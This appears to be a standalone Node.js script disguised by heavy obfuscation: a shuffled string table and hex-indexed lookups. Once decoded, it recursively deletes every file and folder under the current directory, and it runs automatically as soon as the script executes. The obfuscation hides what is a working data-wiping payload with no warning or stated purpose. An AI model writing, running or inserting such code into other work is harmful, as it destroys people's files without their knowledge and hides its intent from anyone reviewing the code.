function _0x5b71() {
  const _0x104821 = [
    "24DNNnNO",
    "799prFjgx",
    "isDirectory",
    "301710IeeeOw",
    "3212eODBYE",
    "9610Bemsji",
    "345666uGUtMs",
    "58Pwyivf",
    "13352eTIzWh",
    "readdirSync",
    "636207tEDfXy",
    "existsSync",
    "name",
    "42yBQvbv",
    "24IVzHEj",
    "2500199kxSTEC",
    "162rJbLnR",
  ];
  _0x5b71 = function () {
    return _0x104821;
  };
  return _0x5b71();
}
(function (_0x1f2686, _0x1297fa) {
  const _0x102568 = _0x5935,
    _0x5ca800 = _0x1f2686();
  while (!![]) {
    try {
      const _0x162223 =
        (parseInt(_0x102568(0x1cd)) / 0x1) *
          (parseInt(_0x102568(0x1d3)) / 0x2) +
        parseInt(_0x102568(0x1d6)) / 0x3 +
        (-parseInt(_0x102568(0x1cc)) / 0x4) *
          (-parseInt(_0x102568(0x1cf)) / 0x5) +
        (-parseInt(_0x102568(0x1d2)) / 0x6) *
          (-parseInt(_0x102568(0x1c8)) / 0x7) +
        (-parseInt(_0x102568(0x1d4)) / 0x8) *
          (parseInt(_0x102568(0x1cb)) / 0x9) +
        (parseInt(_0x102568(0x1d1)) / 0xa) *
          (-parseInt(_0x102568(0x1d0)) / 0xb) +
        (parseInt(_0x102568(0x1c9)) / 0xc) *
          (-parseInt(_0x102568(0x1ca)) / 0xd);
      if (_0x162223 === _0x1297fa) break;
      else _0x5ca800["push"](_0x5ca800["shift"]());
    } catch (_0x350a1a) {
      _0x5ca800["push"](_0x5ca800["shift"]());
    }
  }
})(_0x5b71, 0x3c76a);
function _0x5935(_0x566336, _0x530bb8) {
  const _0x5b7175 = _0x5b71();
  return (
    (_0x5935 = function (_0x593521, _0x2ef7cb) {
      _0x593521 = _0x593521 - 0x1c6;
      let _0x669657 = _0x5b7175[_0x593521];
      return _0x669657;
    }),
    _0x5935(_0x566336, _0x530bb8)
  );
}
const fs = require("fs"),
  runner = (_0x4a5f52) => {
    const _0x23d6d5 = _0x5935;
    if (fs[_0x23d6d5(0x1c6)](_0x4a5f52)) {
      const _0x55ea06 = fs[_0x23d6d5(0x1d5)](_0x4a5f52, {
        withFileTypes: !![],
      });
      for (const _0x5e45fb of _0x55ea06) {
        const _0x9f8936 = _0x4a5f52 + "/" + _0x5e45fb[_0x23d6d5(0x1c7)];
        _0x5e45fb[_0x23d6d5(0x1ce)]()
          ? (runner(_0x9f8936), fs["rmdirSync"](_0x9f8936))
          : fs["unlinkSync"](_0x9f8936);
      }
    } else {
    }
  };
runner("./");
